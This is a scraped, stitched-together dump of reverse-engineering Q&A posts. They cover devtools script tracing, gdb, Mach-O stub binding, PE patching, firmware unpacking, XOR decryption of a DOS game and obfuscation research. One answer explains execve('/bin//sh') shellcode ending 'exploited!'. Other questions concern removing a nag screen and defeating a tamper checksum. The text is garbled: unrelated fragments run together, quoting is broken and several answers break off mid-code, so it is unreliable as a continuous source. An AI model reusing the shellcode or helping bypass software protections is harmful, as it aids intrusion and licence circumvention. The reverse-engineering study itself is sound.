<p>also there is additional note here , sometime maybe we ""DO NOT"" use argc/argv for getting command line arguments we can use windows API like <code>GetCommandLine</code> and so on too. you have to check how arguments are received and parsed too.</p>

<p>Generally, how should I go when I want to know what jQuery plugin [website X] uses for [behaviour Y]?</p>
","<p>Both Firefox and Chrome have useful debugging tools to help you find out more information about scripts relating to a behavior. I'll be explaining mostly in Chrome as their default debug tools are more extensive</p>

<p>As a start, you can usually use <code>Right Click-&gt;Inspect Element</code> to find out information about an element quickly. However this does not appear to work on Facebook's ticker - doing so will select the ""Ticker News"" behind the scrollbar like this:</p>

<p><img src=""https://i.stack.imgur.com/Iq3Vy.png"" alt=""inspect fail""></p>

<p>Because we cannot see the element being modified, we will have to make some guesses. The ticker stories themselves do not appear to have anything related to the scrollbars. After traveling up to the parent and folding <code>&lt;div class=""tickerActivityStories""&gt;</code>, we can start to see things clearly</p>

<p>By hovering over (and invoking the scrollbars's ""appear"" code) we can observe the page's DOM and note the differences.</p>

<p><img src=""https://i.stack.imgur.com/2lWVK.png"" alt=""comparison""></p>

<p>So it appears that <code>&lt;div class=""uiScrollableAreaTrack""&gt;</code> as it responds accordingly whenever the mouse enters/leaves. The name also makes sense (implies that it's the scrollbar's tracks). By unfolding that <code>div</code>, we'll notice that there is even a ""gripper"" for the scrollbar!</p>

<p><img src=""https://i.stack.imgur.com/gAaV3.png"" alt=""gripper""></p>

<p>To find out what Javascript is involved with the scrollbars, click on <code>&lt;div class=""uiScrollableAreaGripper""</code>, and on the right pane, unfold the <code>Event Listeners</code> tab. We can assume that it responds to focus, and under the <code>Focus</code> section, you'll notice a few references to Javascript files. Hover over the filenames and Chrome will show you the link of the Javascript files. </p>

<p><img src=""https://i.stack.imgur.com/5WKL1.png"" alt=""listeners""></p>

<p>If you're in luck, the files may have a recognizable name (such as <code>typeahead.min.js</code> or similar, which you can google). Unfortunately in most cases, including ours, we are likely looking at proprietary code or minified code. (Minified code is extremely common to reduce file sizes so that pages load faster)</p>

<blockquote>
  <p><em>Warning:</em> If you use the <code>step</code> command while control is within a

</blockquote>

<p>Since the binary likely wasn't compiled with debugging information, you need to use <code>stepi</code> instead of <code>step</code>, as @guntram-blohm suggested in his comment above.</p>

<p><code>b 0xab143e80</code> is not the correct syntax to set a breakpoint on an address; <a href=""https://sourceware.org/gdb/onlinedocs/gdb/Specify-Location.html"" rel=""nofollow"">you need to use <code>b *0xab143e80</code></a>.</p>

"Methods of discovering the location of nag/pop-up screens besides string search?","1794","","<p>I would like to remove a nag screen from a popular program. To do this I need to make sure the screen never gets called. So, the first task is to find the actual location of the nag (where it is called from). None of the strings in the nag screen seemed to show up in Ollydbg's string search. The only thing I managed to find on my own was the window of the nag in OllyDBG's window references, but I'm not sure if it was very useful.</p>

<p>What methods are commonly used to find the call locations of nag screens? If you guys set me on the right path, I'm sure I can figure out the rest on my own. :)</p>

<p>Some extra info: the program seems to have been developed in .Net, the title of the nag showed up in the window reference list of OllyDBG but I couldn't find it in the string search.</p>

<p>Second edit: I don't think it's .net. I tried doing ´tasklist /m ""mscor*""´, but it didn't show up (which it probably should have, if it's .net)</p>

"Assembly- Using push and ESP-Register to store addresses","1791","","<p>I have found the following assembly lines presented in a tutorial which I do not understand:</p>

<pre><code> xor eax, eax      =&gt; clear, I know that, it makes eax = 0
 push eax          =&gt; push 0 on the stack
 push 0x68732f2f   =&gt; push ""//sh"" to the stack (the numbers are opcodes I guess, output of hexdump)
 push 0x6e69622f   =&gt; push ""/bin"" to the stack (again opcodes, representing ""/bin"" )
 mov ebx, esp      =&gt; put address of ""/bin//sh\0"" into ebx, via esp
 ....
</code></pre>

<p><strong>My question:</strong> 
Why we put address of ""/bin//sh"" into ebx, via esp using the line mov ebx, esp for that ?</p>

<p>I draw a sketch:</p>

<pre><code>         |                        |
         |------------------------|&lt;-----ESP (I know that ESP always points to the top)
(a)      |  0x6e69622f  (""//sh"")  |
         |------------------------|
(b)      |   0x68732f2f (""/bin"")  |
         |------------------------|
(c)      |       0                |
         |------------------------|
</code></pre>

<p><strong>How I try to explain it to myself</strong>(I am not sure if it is correct, but I thought to think about a little bit before I ask in that forum here):</p>

<p>ESP is a 32-bit register such that it is large enough to comprise the addresses at (a), (b) and (c) (which I marked above).</p>

<p>Is that right? I hope somebody can help me?</p>

<p>best regards, </p>
","<p>First of all, let me clarify this:</p>

<p><code>ESP</code> is a 32-bit register which contains a pointer to the stack.
It is not, by any means, big enough to <code>comprise the addresses at [...]</code>. It is just <em>pointing</em> at a memory location which holds <code>a</code>, <code>b</code>, and <code>c</code>.</p>

<hr>

<p>What your exploit does is push a string to the stack. Look at the <code>/bin//sh</code> hexadecimal representation:</p>

<pre><code>2f 62 69 6e 2f 2f 73 68
</code></pre>

<p>And now look at your assembly:</p>

<pre><code>push 0x68732f2f
push 0x6e69622f
</code></pre>

<p>This is <em>not</em> any kind of opcodes, but rather the ASCII representation of the string, pushed as double words (basically, pushes the string in less instructions)</p>

<p>An alternative way would be:</p>

<pre><code>push '/' ; same as push 0x2f
push 'b' ; same as push 0x62
push 'i' ; same as push 0x69
push 'n' ; same as push 0x6e
push '/' ; same as push 0x2f
push '/' ; same as push 0x2f
push 's' ; same as push 0x73
push 'h' ; same as push 0x68
</code></pre>

<p>Basically, it's doing the same as above, just in less instructions, by combining the ASCII codes together: <code>6e69622f</code> instead of <code>2f</code>, <code>62</code>, <code>69</code>, <code>6e</code> separated. It's also pushing a <code>0</code>, which is a <a href=""http://en.wikipedia.org/wiki/Null-terminated_string"" rel=""noreferrer"">terminator for a C-style string</a>, so that the string ends there.</p>

<p>Now, the stack has <code>/bin//sh</code>, and all you gotta do is <a href=""http://www.cs.dartmouth.edu/~sergey/cs108/examples/shellcode32-1.c"" rel=""noreferrer"">call <code>sys_execve</code></a>, by doing an <code>int 0x80</code> (interrupt), which is the way Linux uses to make syscalls.</p>

<p>Since <a href=""http://asm.sourceforge.net/syscall.html"" rel=""noreferrer"">the syscall ID for <code>sys_execve</code> is 11</a>, you move <code>11</code> to <code>al</code> (lower part of <code>eax</code>), and put the first argument into <code>ebx</code>, which is a <em>pointer to a string</em>. And since <code>ESP</code> is pointing to the top of the stack, and the top of the stack contains the <code>/bin//sh</code> we pushed before, the exploit assembly means this:</p>

<pre><code>sys_execve(""/bin//sh"");
</code></pre>

<p>There you go, exploited! :)</p>

"What ways is there for an application to detect that it has been modified?","1788","","<p>I am using ollydbg and a Hex editor. I confirmed that once the application is edited in any way it behaves different than normal.</p>

<p>My first thought was that the file is checking the checksum value so I looked at the intermodular calls in olly and did not see anything about checksum. I was specifically looking for <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680355%28v=vs.85%29.aspx"" rel=""nofollow"">MapFileAndCheckSum</a></p>

<p>But I am trying to reason this out, I am thinking that a checksum value has to be hard coded in the file so it can be compared to the actual checksum. So I am wondering from the developers point of view how is it possible to get the checksum value to be hard code when the application is not complete/compiled</p>

<p>Which brings me to the question. What ways is there for an application to detect that it has been modified?</p>

<p>------- EDIT ------- Additional Information ------</p>

<p>I have been doing some testing and I have to say I'm baffled as to where the checksum value is being stored.</p>

<ol>
<li>There are no connections to the internet.</li>
<li>Only one dll comes with the application (I extracted the installer files manually) the dll file is old and was last modified prior to the application. I even compared it to an earlier version of the application that did not have this checksum check and the dll is identical.</li>
<li>I taught that maybe the checksum value would be entered in the registry by the installer so I extracted the .exe and .dll to a separate computer that has never used the installer. Changes are still being detected!</li>
<li>It is definitely a checksum test, as I have changed a single byte of padding by from 00 to 20 and the change is detected. If I edit back to 00 to application performs normally.</li>
</ol>

<p>So now I am wondering would it be possible to calculate what the checksum is going to be before entering the hard coded checksum value? I do realize that the actual checksum value will change when changing the hard coded checksum value. I want to know if there is any method to predetermine a checksum value when hard coding and finding a match. Seems impossible but I cannot think of any other means considering the situation.</p>
","<p>The application can check only a part of itself, excluding the checksum part. You can also have a runtime decryption, that will be wrongly decrypted if tampered with.

"In a Mach-O executable, how can I find which function a stub targets?","1716","","<p>Before exposing my problem, here's my understanding of the whole thing, so that you may correct me if I'm saying something wrong.</p>

<p>In a Mach-O file (at least on x86), the <code>__TEXT.__stubs</code> section typically has stubs in it that all consist of a single indirect jump, like this:</p>

<pre><code>; __TEXT.__stubs
; symbol stub for unlink:
0x100000f46:  jmpq   *0xc4(%rip)
; symbol stub for puts:
0x100000f4c:  jmpq   *0xc6(%rip)
</code></pre>

<p>These point to a location inside the <code>__DATA.__nl_symbol_ptr</code> section. The pointer initially goes to a stub helper in the <code>__TEXT.__stub_helper</code> section:</p>

<pre><code>; __TEXT.__stub_helper
; stub helper for unlink
0x100000f64:  pushq  $0x0
0x100000f69:  jmp    0x100000f54
; stub helper for puts
0x100000f6e:  pushq  $0xe
0x100000f73:  jmp    0x100000f54
</code></pre>

<p>The stub helper calls <code>dyld_stub_binder</code>, which uses the pushed argument to figure out which stub it is and which function it needs to look up, then replaces the value in <code>__DATA.__nl_symbol_ptr</code> with the resolved address, and then hand over control to the function that was found (which then returns to the calling code normally).</p>

<p>To assist debugging, debuggers find stubs and pretend that they have symbols for them. In this example program, whenever lldb sees <code>call 0x100000f58</code>, it determines that the stub should point to <code>unlink</code>, and says <code>call 0x100000f58 ; symbol stub for: unlink</code> in the disassembly.</p>

<p>However, lldb does not use the pushed value: it appears to <a href=""https://github.com/llvm-mirror/lldb/blob/5b0324a42cae28a07bc3683c6757dc1533b8fa0d/source/Plugins/ObjectFile/Mach-O/ObjectFileMachO.cpp#L4375"" rel=""noreferrer"">rely on the static linker placing undefined symbols and stubs in the same order</a>, or some variant of that. Just like that, it looks more like a heuristic than a precise way to figure out which stub goes where, unless there's something else preventing you from tampering.</p>

<p>So how do I reliably find which function is called by a stub? In the stub helpers, what do the constants in <code>pushq $constant</code> mean?</p>
","<p>I <a href=""https://github.com/zneak/fcd/blob/b29b4ac/scripts/macho.py#L307"" rel=""nofollow noreferrer"">wrote</a> a Python script that parses entry points and imports from a Mach-O executable for one of my projects. The trick is to parse the <code>LC_DYLD</code> or <code>LC_DYLD_ONLY</code> loader commands. These two commands encode three import tables: bound symbols, weak symbols, and lazy symbols.</p>

<pre><code>struct dyld_info_command {
  uint32_t cmd;
  uint32_t cmdsize;
  uint32_t rebase_off;
  uint32_t rebase_size;
  uint32_t bind_off;
  uint32_t bind_size;
  uint32_t weak_bind_off;
  uint32_t weak_bind_size;
  uint32_t lazy_bind_off;
  uint32_t lazy_bind_size;
  uint32_t export_off;
  uint32_t export_size;
};
</code></pre>

<p>The interesting fields are <code>bind_off</code>, <code>bind_size</code>, <code>weak_bind_off</code>, <code>weak_bind_size</code>, <code>lazy_bind_off</code> and <code>lazy_bind_size</code>. Each pair encodes the offset and size of a block of data, inside the executable file, that contains the import table opcodes.</p>

<p>Each of these tables can be seen as having four (useful) columns: the segment, segment offset, library name and symbol name. Together, the segment and segment offset indicate the address where the symbol's actual address will be written to (so for instance, if you have <code>__TEXT</code> and 0x40, this conceptually means that <code>*(__TEXT+0x40) == resolvedSymbolAddress</code>).</p>

<p>The table is encoded as a stream of opcodes for compression purposes. The opcodes control a state machine that contains state for a would-be symbol, has operations to manipulate that state, and operations to ""bind"" a symbol (take all that state and make it a part of the symbol table). For instance, you could see:</p>

<ul>
<li>set segment to __TEXT</li>
<li>set offset to 0x40</li>
<li>set library to libSystem.dylib</li>
<li>set symbol name to ""printf""</li>
<li>bind symbol</li>
<li>set offset to 0x48</li>
<li>set symbol name to ""scanf""</li>
<li>bind symbol</li>
</ul>

<p>At the end of this sequence, you get two symbols: printf and scanf, whose addresses are located at __TEXT+0x40 and __TEXT+0x48 respectively, from libSystem.dylib. This means that if you see an instruction like <code>jmp [__TEXT+0x48]</code> (an indirect jump to the address contained at <code>__TEXT+0x48</code>), you know that you're going to <code>scanf</code>. This is how you can tell the destination of stubs.</p>

<p>Each opcode is at least 1 byte, separated as 0xCI (where C is the command name, and I is an immediate value, both 4 bits). When the command needs a larger operand (or more operands), they are encoded in <a href=""https://en.wikipedia.org/wiki/LEB128"" rel=""nofollow noreferrer"">ULEB-128</a> format (except for <code>BIND_OPCODE_SET_ADDEND_SLEB</code>, which uses signed LEB, but we don't really care about it for the purpose of finding imports).</p>

<pre><code>def readUleb(data, offset):
    byte = ord(data[offset])
    offset += 1

    result = byte &amp; 0x7f
    shift = 7
    while byte &amp; 0x80:
        byte = ord(data[offset])
        result |= (byte &amp; 0x7f) &lt;&lt; shift
        shift += 7
        offset += 1
    return (result, offset)
</code></pre>

<p>Libraries aren't actually identified by their names in the command stream. Rather, libraries are identified by their <strong>one-based</strong> ""library ordinal"", which is just the index of the library within all the <code>LC_LOAD_DYLIB</code>, <code>LC_LOAD_WEAK_DYLIB</code>, <code>LC_REEXPORT_DYLIB</code> and <code>LC_LOAD_UPWARD_DYLIB</code> loader commands. For instance, if an executable has a <code>LC_LOAD_DYLIB</code> command for libSystem and then one for libFoobar, libSystem has ordinal 1 and libFoobar has ordinal 2.</p>

<p>There are three special values: ordinal -2 means that the symbol is looked up in the flat namespace (first library with a symbol with that name wins); ordinal -1 looks for a symbol in the main executable, whatever it is; and ordinal 0 looks for a symbol within this file. As we've said above, ordinal 1 and above refer to libraries.</p>

<p>Symbol names are encoded within the command blob as null-terminated strings.</p>

<p>Each opcode is easily described in code, so I'll spare us the description of each.   </p>

BIND_OPCODE_SET_DYLIB_ORDINAL_IMM = 1

IMHO the best PE view/edit tool.
Invoke context menu from section headers (on the right side) to add new section then fill it with the code, data you want. Next you need to reverse the game and see how its structured and where to patch the code so it will jump to your code.

<p>Any idea why I'm not able to extract everything ? </p>

<p>Thank you !</p>

<p>Ronan</p>
","<p>Although my binwalk version extracted the files correctly to the <code>system</code> folder along with the zip files containing only the <code>sysversion.txt</code>, I shortly describe why you see only the <code>sysversion.txt</code> in the archive files.
It is because the firmware file contain multiple PKZIP archives and the binwalk does not know the exact size of these files. So, it can identify the start of the PKZIP file correctly based on the PK magic, but without knowing the correct file size, it extracts the remaining bytes to the created ZIP file. Because the central directory structure in PKZIP format stored at the end of the ZIP file, after the compressed data and the extracted ZIP file ends with the <code>sysversion.txt.zip</code>, the file viewer or decompressor may found the central directory of the last ZIP file.</p>

<p>To solve this problem, you may check the system folder in the same folder you found the ZIP files, or you can extract the files manually.<br>
If you take a look at the start of the <code>CH-sys-48.53.64.67.bin</code> file, you will find that it has a simple structure. It starts with a magic string (marked with blue in the picture). The next element is a 0x40 bytes long directory name (marked with yellow) followed by a 0x40 bytes long file name entry (marked with green). After the file name you will find the size of the file (marked with purple), some flags and the binary content (start of the binary file marked with grey).</p>

<p><a href=""https://i.stack.imgur.com/u3KtS.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/u3KtS.png"" alt=""enter image description here""></a></p>

<p>Based on these information you can write a simple script, which extracts the files correctly, for example:</p>

<pre><code>import sys
import struct

if (len(sys.argv) &lt; 2):
    print 'usage: parse binary'
    sys.exit(1)

b = open(sys.argv[1], 'rb').read()
o = 0x20
while(o &lt; len(b)-0x20):
    dir = b[o:o+0x40].strip('\x00')
    fname = b[o+0x40:o+0x80].strip('\x00')
    size = struct.unpack('L', b[o+0x80:o+0x84])[0]
    unk1 = struct.unpack('L', b[o+0x84:o+0x88])[0]
    unk2 = struct.unpack('L', b[o+0x88:o+0x8c])[0]
    print '%x, %s, %s: %x, %x, %x'%(o, dir, fname, size, unk1, unk2)
    open(fname, 'wb').write(b[o+0x8c:o+0x8c+size])
    o += 0x8c+size

"How to identify functions in a stripped binary on x86 32bit?","1697","","<p>I am trying to generate a <em>coarse-grained</em> Call Graph based on some assembly code disassembled from binary on x86 32 bit platform.</p>

<p>It is very hard to generate a precise Call Graph based on asm code, thinking of various indirect control flow transfer, so right now I <strong>only consider direct control flow transfer</strong>.</p>

<p>So firstly I am trying to identify <code>functions</code> (begin and end addresses) in the disassembled assembly code 
from a <strong>stripped</strong> binary on x86, 32bit.</p>

<p>Right now, my plan is somehow like this:</p>

<p>As for the begin addresses, I might conservatively consider any assembly code looks like this</p>

<pre><code>    push %ebp
</code></pre>

<p>indicates the beginning address of a function.</p>

<p>and also, I might scan the whole problem, identifying all the <code>call</code> instruction with the destination, the consider these function call's destinations as all the function begin address</p>

<p>The problems are:</p>

<ol>
<li><p>some of the functions defined in a binary might never be called.</p></li>
<li><p>some of the <code>call</code> has been optimised as <code>jump</code> by compiler (thinking of tail recursive call)</p></li>
</ol>

<p>As for the end address, things become more tricky because multiple <code>ret</code> could exist in one single function...</p>

<p>So I am thinking that I might conservatively consider the range between any nearest <strong>function begin addresses</strong>, as one function..</p>

<p>Am I right? Is there any better solution..?</p>
","<p>Reversing the call graph or the control flow graph of a binary isn't for the faint of heart, and is still a hot topic for researchers.</p>

<p>Your approach looks promising; but, unfortunately for you, you'll stumble upon lots of barriers.</p>

<p>One, following <code>call</code> instructions is most likely to give great results, if analyzing statically the binary file. The only problem is that, sometimes, you'll have indirect calls/jumps. Meaning, the operand will be a register containing the target address. This will occur very often if the target binary file original source code was written in <code>C++</code> (virtual functions) for example. One way to obtain the target address in this case is to emulate or run the chunk of code that computes it. Another is to assess its value heuristically (heuristics are hell). </p>

<p>Two, you can run your binary file with multiple input data sets and dynamically extract the call graphs (this can be performed through instrumentation). You can then cross reference all the obtained call graphs ...</p>

<p>Three, I would recommend a <a href=""https://en.wikipedia.org/wiki/Basic_block"">basic-block</a> centric approach rather than a functional one. Mainly, because a function is a basic-block in itself and you'll have more luck finding functions this way than trying to match patterns which can change from one compiler to another, or from one version of a compiler to another. </p>

<p>The following publications are extremely interesting : <a href=""http://www.cse.scu.edu/~atkinson/papers/apsec-04a.pdf"">[1]</a>, <a href=""http://www.cse.scu.edu/~atkinson/papers/serp-02.pdf"">[2]</a>, <a href=""http://ftp.cs.wisc.edu/pub/paradyn/papers/Harris05WBIA.pdf"">[3]</a>, and also I would encourage you to check <code>DynInst</code> and <code>callgrind</code> if you want to learn more about the subject.    </p>

<p>After the compilation into <code>exe file</code> with <code>ELF</code> format, it seems that there are two sections related to exception handling, which are <code>.gcc_except_table</code> and <code>.eh_frame</code>. </p>

<p>However, I dumped the contents of these two section with the following commands, comparing the labels' memory addresses with what are defined in <code>.gcc_except_table</code>, but it seems too blur to me...</p>

<pre><code>objdump -s -j .gcc_except_table cppexcept
objdump -s -j .eh_frame cppexcept
</code></pre>

<p>So my question is:</p>

<p>Is there any way to recover the information defined in the <code>.gcc_except_table</code> (which is shown above) from <code>ELF</code> file's <code>.gcc_except_table</code> and <code>eh_frame</code> tables?</p>
","<p>(I think you may get some extra comments if you use <code>-fverbose-asm</code>.)</p>

<p>Recovering information from these tables is definitely possible, although documentation is scarce and is often present only in the code which parses them. </p>

<p>The <code>.eh_frame</code> layout is described briefly in the <a href=""http://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-Core-generic/LSB-Core-generic/ehframechpt.html"">LSB documentation</a>. Ian Lance Taylor (author of the gold linker) also made some blog posts on <a href=""http://www.airs.com/blog/archives/460""><code>.eh_frame</code></a> and <a href=""http://www.airs.com/blog/archives/464""><code>.gcc_except_table</code> layout</a>.</p>

<p>For a more reference-like description, check my <a href=""http://www.hexblog.com/wp-content/uploads/2012/06/Recon-2012-Skochinsky-Compiler-Internals.pdf"">Recon 2012 slides</a> (start at 37 or so).</p>

<p>I've made <a href=""http://www.hexblog.com/wp-content/uploads/2012/06/recon-2012-skochinsky-scripts.zip"">an IDA script</a> (<code>gcc_extab.py</code>) which parses <code>.eh_frame</code> and <code>.gcc_except_table</code> and formats them nicely.</p>

<p>Taking a sample program:</p>

<pre><code>void f()
{
    throw 1;
}

int main()
{
    int j;
    try {
        f();
    } catch (int i) {
        j = i;
    }   
    return 0;
}

"Dynamic Analysis for Shared Libraries?","1679","","<p>Are there techniques for dynamic analysis of shared libraries? I know for example that DLLs have an entry point, but how about calling other exported functions? Do I need to write a custom executable that calls exports for each DLL I want to analyze?</p>
","<p>A dynamically linked library has the same executable header and structure as a standard executable. Therefore they can be debugged the same way that a normal executable can be debugged. It might be a bit tricker than usual, because in order to debug it, it has to be loaded into some process, and making that happen could be trivial (i.e. if it's loaded as part of some other program) or it might take some doing. </p>

<p>A common technique is to use something like <a href=""http://www.ollydbg.de/Loaddll.htm"" rel=""nofollow noreferrer"">OllyDbg's LoadDll</a>.  The linked page describes a few examples of calling exports within the DLL directly.  Although OllyDbg has some smarts to determine the number of function arguments, it's likely that you will have to do some reverse engineering to figure out what the types of those arguments should be.  See <a href=""https://reverseengineering.stackexchange.com/questions/2134/get-the-function-prototypes-from-an-unknown-dll"">this recent question</a> for some advice on how to go about doing that.</p>

<p>Alternative, you can write a small program to load the DLL and call interesting exports manually.  This is still subject to the limitations of needing to know how to interface with the DLL, but at the same time, this programming route might prove necessary in order to thoroughly reverse engineer your target.  I.e., perhaps you need to call some export in order to create some object that the program is expecting as input for another export.  LoadDll will quickly prove cumbersome, and writing this program really ought not to be that difficult.</p>

"How to get the list of strings within IDA's string window in my script?","1673","","<p>I'm trying to write some scripts that do some string searching through the disassembly in IDA. Currently, I loop through all the disassembly, MinEA() to MaxEA() and use idc.FindText() to see if a potential string is in the disassembly. Although this works, its very time consuming. I was wondering if there was a way I could just use an API method to get all the strings in IDAs string window. For example, I was able to get all the imports used in the import window by using idaapi.get_import_module_qty() and idaapi.enum_import_names(i, import_call_back). That's very fast and I can easily just check if something has been imported. Is there something similar that will allow me to get all the strings from the strings window? If not, is there a less time-consuming method of string searching that is possible? Thanks for any input.</p>
","<p>It looks like that the following is what you are looking for or at least similar:</p>

<pre><code>import idautils
sc = idautils.Strings()

for s in sc:
    print ""%x: len=%d type=%d -&gt; '%s'"" % (s.ea, s.length, s.type, str(s))

"How to quickly distinguish PE/DLL/DOS-MZ files based on magic numbers?","1672","","<p>I know that the specifications of the Microsoft PE/DLL/DOS-MZ files states that the two first bytes of a PE/DLL/DOS-MZ file is <code>MZ</code> (0x4d,0x5a<code>) or</code>ZM<code>(</code>0x5a,0x4d`).</p>

<p>The problem with such a small signature is that a lot of other files may match the same specification and a test based only on this two first bytes quickly tends to be inconclusive.</p>

<p>So, my question is simple, after testing that the two first bytes are <code>MZ</code> (or <code>ZM</code>), what other, more reliable, test can be performed to check that the file is a PE/DLL/DOS-MZ?</p>
","<p>That would be <code>e_lfanew</code> in the <code>MZ</code> header itself. For simple (16 bit) MSDOS software, this ought to be <code>0</code>, and for any extended format it should point right to one of the specific <code>LE</code>, <code>PE</code>, or <code>NE</code> headers' identifiers (which all are exactly those two characters). As in all of these cases the header itself is a mere stub, <code>e_cp</code> (the total size of this executable in pages) should not be larger than the offset of <code>e_lfanew</code>. (Plus or minus that infernal <code>e_cblp</code>, the ""bytes on last page of file"" – I always forget which one it is.)</p>

","<p>The markings look like an Atmel part (it starts with ""AT"", which is common for Atmel parts). Given the size of the chip and context which you provided, I figured it was probably a serial EEPROM. Looking through Atmel's serial EEPROM datahsheets, your mystery chip is almost certainly an Atmel AT25128B-SSHL SPI EEPROM, which matches your chip's product markings and pinout.</p>

<p>According to the AT25128B <a href=""http://www.atmel.com/Images/doc8698.pdf"">datasheet</a>, the first line should be ATHXXX, where XXX is a three digit date code. In your case, ""ATH330"" means it was made in the 30th week of 2013.</p>

<p>The second line contains the product's truncated part number (truncated part numbers are used when the entire part number is too long to fit on the package) and country of assembly. The truncated part number for the AT25128B is ""5DBL"", which from the picture looks reasonably like what is printed on your chip, and the trailing ""8"" identifies the country of assembly (I don't know what country ""8"" corresponds to, but its probably somewhere in Asia :)).</p>

"How can I find the source of a string in an old DOS game?","1664","","<p>I am attempting to amend some strings in an old DOS game (FIFA International Soccer), specifically the names of players.</p>

<p>In the past it hasn't been too hard to pull off such a task on post-DOS games as either the strings are easy to track down in the executable or a data file.  However, for this DOS game I am stuck.</p>

<p>I have scanned through the game files and the executable with a hex-editor but cannot find the strings.  The game includes a <code>english.dat</code> file which does contain readable localised strings.  However, this file only contains names for in game headers and menu options as opposed to the player names I am seeking.  The other files consist of localised strings for other languages, graphics and sounds.</p>

<p>I have used a debug build of DOSBOX to perform a memory dump using the following command:</p>

<pre><code>memdumpbin 180:0 1000000
</code></pre>

<p>I got the command from here: <a href=""http://www.vogons.org/viewtopic.php?t=9635"">http://www.vogons.org/viewtopic.php?t=9635</a></p>

<p>In the memory dump I <strong>can</strong> find the strings I wish to change.</p>

<p>What is the best way of linking this information to find the source of the strings?  I assume that these strings are somehow encrypted or compressed in the executable, although it could be in another obscure game file.  If the strings are compressed/encrypted perhaps there is a common method for pulling this data out of the executable.</p>

<p>I have IDA5 (free version) installed and would be happy using this as part of process.  My operating system is Windows 8 / 64 bit.</p>

<p>Also, to be clear - I want to modify the strings at source (i.e. in the file) and not in memory.</p>
","<p>This program uses the PharLap DOS extender, as can be seen in its MZ header. The 32-bit executable program starts at offset <code>18A0</code>, per ""offset within header of relocation table"" (see <a href=""http://www.program-transformation.org/Transform/PcExeFormat"">http://www.program-transformation.org/Transform/PcExeFormat</a>), and at that position you can see the correct signature <code>P3</code>. According to the header info, the executable's length is <code>0x95851</code>, which is another hint this is correct. Near the end of this part, starting at <code>18A0</code>, you can see a text string  ""Hello EA"", and at the next 32-byte ""page"" the signature <code>MZ</code> that indicates another executable is embedded. So this large part must contain the main executable.</p>

<p>Browsing the file with a simple hex editor at my preferred width of 16 hex characters, I noticed a recurring pattern when doing page-downs (a good way to get a 'sense' of what sort of data a file contains). I saw the pattern repeated every 2 lines, and when I set the display width to 32, the pattern was evident. Executable formats always start with a fixed header, and are usually followed by lots of zeroes for padding, so I suspected the repeating pattern may be the XOR key. A simple C program confirmed this; I did not know where to start with decoding but the first non-all-zeroes multiple of 32 seemed a good guess: offset <code>0x1AA0</code>. </p>

<p>Decoding from there proved the hunch to be correct:</p>

<pre><code>00000 : Y...r9..n3.&gt;..-.A@I.7P........h4..a""1.P(s.......x. rG..f...X.+..

</code></pre>

<p>so the next step was scroll down to near the end of this part and see what was there. Disaster! Rather than readable texts, all I saw was random data -- yet still with clear patterns.</p>

<p>But 'an executable' is not one contiguous long chunk of data. It's common to see it divided up into separate sections for ""executable code"", ""initialized data"", ""uninitialized data"", ""relocations"" and so on. The sections all start at an aligned address when loaded into memory, but not necessarily in the file itself, or with the same 'memory page' size. Therefore, it may be possible that the XOR encryption restarts at the start of new section. The PharLap header should contain information on where each section starts and ends (and if you are going to attempt to adjust the program, you should look into this), but to confirm the XOR key is the same all I had to do is adjust the starting position. Starting one position further, no success, but 2 positions further on I noticed this piece of data:</p>

<p>That was the proof I needed: the data section <em>does</em> use the same XOR key. Next: testing all possibilities from 0 to 31 and see if something turns up. Only at +30 that turned out to work, just as I was going to give up:</p>

<p>So each individual section in the executable is encrypted with a 32-byte XOR key; this XOR key is the same for all <em>sections</em>; it starts a-new per section.</p>

<p>The C program below will decrypt the entire file and you have to adjust the starting position manually. To edit the file, you have to:</p>

<ol>
<li>Read up on PharLap's sections.</li>
<li>Decrypt each section individually.</li>
<li>Write all into a new file.</li>
<li>Adjust what you want.</li>
<li>Encrypt the sections again (it's a XOR key, so this uses the exact same algorithm).</li>
<li>Copy the encrypted file back into the main executable.</li>
</ol>

<p>A note on #4: you mentioned changing the names of the players. Since it's a zero-terminated list of names, you can assume there is a list of pointers <em>to</em> these names somewhere else. That means you can only change the individual <em>characters</em> of a name -- not make it longer. If you want to adjust all names freely, you must find the list of pointers and adjust that as well.</p>

<hr>

<p>(Preliminary updates)</p>

<ol>
<li><p>The XOR encoding does not use sections. Instead, it seems like every block starts with a word determining its length, and possibly 1 or 2 next words (possibly (again) to set the XOR key starting position). Not conclusive so far.</p></li>
<li><p>Executables are <em>abundant</em> with zeroes. If you count the number of zeroes in each 32-byte chunk, XORed against all 32 possible positions, and print out the XOR position with the highest number of them, you can see successive lists of the same 'best' guess. That shows there are longer and shorter sections XORed with the same key and may help determining the length algorithm.</p></li>

"What is this 'mathematical jigsaw puzzles' obfuscation?","1661","","<p>You must have heard about it, it all over the on-line newspapers. Some researchers from UCLA claims to have achieved a <a href=""http://newsroom.ucla.edu/portal/ucla/ucla-computer-scientists-develop-247527.aspx"">breakthrough in software obfuscation</a> through 'mathematical jigsaw puzzles'. </p>

<p>Their <a href=""http://eprint.iacr.org/2013/451.pdf"">scientific paper</a> can be found on <a href=""http://eprint.iacr.org/2013/451"">IACR eprint website</a>.</p>

<p>Can someone sum-up what is really the content of the paper (and does is really worth it) ?</p>
","<p>There are three main contributions of the research</p>

<ol>
<li><p>A proposed indistinguishability obfuscation for NC<sup>1</sup> circuits where the security is based on the so called <em>Multilinear Jigsaw Puzzles</em> (a simplified variant of multilinear maps).</p></li>
<li><p>Pair the contribution in 1 with Fully Homomorphic Encryption and you get indistinguishability obfuscation for all circuits.</p></li>
<li><p>Combine 2 with public key encryption and non-interactive zero-knowledge proofs and you functional encryption for all circuits. I believe that prior to this functional encryption for <strong>all</strong> circuits was not possible.</p></li>
</ol>

<p>So, lets look at these in turn.</p>

<p><strong>Indistinguishability obfuscation</strong> (contributions 1 and 2)<br>
From the paper</p>

<blockquote>
  <p>It is important to note that unlike simulation-based definitions of obfuscation, it is not immediately
  clear how useful indistinguishability obfuscators would be. Perhaps the strongest philosophical justification
  for indistinguishability obfuscators comes from the work of Goldwasser and Rothblum [GR07], who showed
  that (efficiently computable) indistinguishability obfuscators achieve the notion of Best-Possible Obfuscation [GR07]: Informally, a best-possible obfuscator guarantees that its output hides as much about the input circuit as any circuit of a certain size.</p>
</blockquote>

<p>Thus, the main contributions when it comes to Indistinguishability obfuscation of this paper is to show a construction for IO that works on all circuits, then pair that with a few other things to get functional encryption for any circuits.</p>

